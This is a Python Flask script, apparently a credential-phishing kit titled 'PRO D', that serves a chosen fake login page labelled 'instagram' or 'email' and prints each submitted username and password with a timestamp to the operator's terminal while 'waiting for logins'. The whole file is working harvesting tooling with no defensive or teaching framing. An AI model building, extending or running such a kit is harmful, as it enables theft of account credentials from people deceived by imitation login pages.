import os
import sys
import logging
import socket
from flask import Flask, request, send_from_directory
from datetime import datetime

# -------- Auto-install Flask if missing --------
def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    from flask import Flask, request, send_from_directory
except ModuleNotFoundError:
    print("Installing Flask...")
    install("flask")
    from flask import Flask, request, send_from_directory

# -------- Colors --------
red = '\033[1;31m'
grn = '\033[1;32m'
ylo = '\033[1;33m'
cyan = '\033[1;36m'
pink = '\033[1;35m'
reset = '\033[0m'

# -------- Suppress Flask logs --------
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{red}
 ____  ____   ___    ____  
|  _ \\|  _ \\ / _ \\  |  _ \\ 
| |_) | |_) | | | | | | | |
|  __/|  _ <| |_| | | |_| |
|_|   |_| \\_\\\\___/  |____/ 

{cyan}            PRO D
{pink}         Created by Dhani v1.0{reset}
""")

# -------- Flask App --------
app = Flask(__name__)
selected_html = "1.html"  # default HTML file

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Username: {ylo}{username}{cyan}            
║ {cyan}Password: {ylo}{password}{cyan}            
║ {cyan}Time    : {ylo}{timestamp}{cyan} 
╚══════════════════════════════╝{reset}
""")
    return "Login received! Check terminal."

# -------- Find free port --------
def get_free_port(start_port=8080):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1

# -------- Run Flask on available port --------
def run_server():
    port = get_free_port(8080)
    print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
    print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
    app.run(host="127.0.0.1", port=port, debug=False)

if __name__ == "__main__":
    banner()

    # ----- menu -----
    print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Page Template{pink}        
╠══════════════════════════════╣
║ [1] instagram                
║ [2] email                  
╚══════════════════════════════╝
{reset}""")
    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "1.html" if choice == "1" else "2.html"

    run_server()
